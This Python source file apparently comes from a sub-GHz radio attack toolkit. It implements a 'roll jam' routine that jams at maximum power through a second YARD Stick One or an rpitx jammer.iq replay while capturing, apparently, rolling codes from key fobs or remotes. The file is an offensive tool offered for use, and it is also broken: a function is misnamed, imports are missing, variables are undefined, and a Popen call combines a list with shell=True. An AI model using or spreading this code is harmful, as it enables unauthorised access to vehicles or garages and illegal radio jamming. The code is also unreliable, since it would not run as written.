import subprocess
from core.subghz import yardstick_rx
from rflib import *

def roll_jam(rpitxJ, ysJ):
    if rpitxJ != None: # if jamming with rpitx
        print(f"[*] Starting Jammer with rpitx..\n")
        jammer = rpitxJammer(frequency, rpitxJ)
        yardstick = yardstick_rx()
        signals = yardstick.capture_signals(d, minRSSI, maxRSSI, bs)
        print("[*] Stopping has been Jammer..")
        jammer.kill() # stop jammer
        time.sleep(1)
    elif ysJ: # if jamming with another yardstick 1
        print("[*] Starting jammer with other ys1..\n")
        jammer = yardstick_jammer(frequency)
        yardstick = yardstick_rx()
        signals = capture_signals(d, minRSSI, maxRSSI, bs)
        c.setModeIDLE()
        print("[*] Jammer has been stopped..\n")
    
    return signals

# jam wit yardstick
def yardstick_jammer(frequency):
    '''
    Function to jam with second yardstick one plugged in at an 80000
    plus or minus offset with a preset of "F"s being transmitted for
    easy filtering
    - returns object
    '''
    c = RfCat(idx=1)
    c.setMdmModulation(MOD_ASK_OOK) #ASK/OOK for jammer
    offset = frequency - 80000
    if offset < 300000000:
        offset = frequency + 80000
    c.setFreq(offset)
    c.setMdmDRate(2000)
    c.calculatePktChanBW()
    c.setMdmChanSpc(25000)
    c.setChannel(0)
    c.setMaxPower() # max power
    c.lowball(0)
    c.setRFRegister(PKTCTRL1, 0xFF) # Jam "F"
    c.setModeTX()
    return c

# jam wit rpitx
def rpitx_jammer(frequency, rpitxJ):
    '''
    fucnntion to jam with rpitx with the sendiq.sh jammer file created at a 80000
    plus or minus offset.
    - returns object
    '''
    # frequency offset of -80000, change as necessary
    freqOffset = frequency - 80000
    if freqOffset < 300000000:
        freqOffset = frequency + 80000
    # Prerequisite: jammer.iq file must be in rpitx directory..
    proc = subprocess.Popen(["cd", rpitxJ, "&&", "sudo", "./sendiq", "-s","250000", "-f", str(freqOffset), "-t", "u8", "-i", "jammer.iq"], stdout=open('/dev/null', 'w'), stderr=open('/dev/null', 'a'), shell=True, preexec_fn=os.setpgrp)
    return proc